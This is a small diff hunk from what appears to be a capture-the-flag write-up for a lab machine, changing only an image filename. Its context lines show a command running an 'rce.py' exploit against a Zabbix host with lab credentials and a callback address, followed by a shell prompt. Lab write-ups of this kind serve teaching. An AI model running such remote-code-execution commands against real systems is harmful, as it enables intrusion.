@@ -158,7 +158,7 @@ $ python3 rce.py http://zabbix.shibboleth.htb Administrator ilovepumkinpie1 10.1
 [+] got a shell ? [y]es/[N]o:
 ```
 
-<figure><img src="../../../.gitbook/assets/image (44) (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (44) (5) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
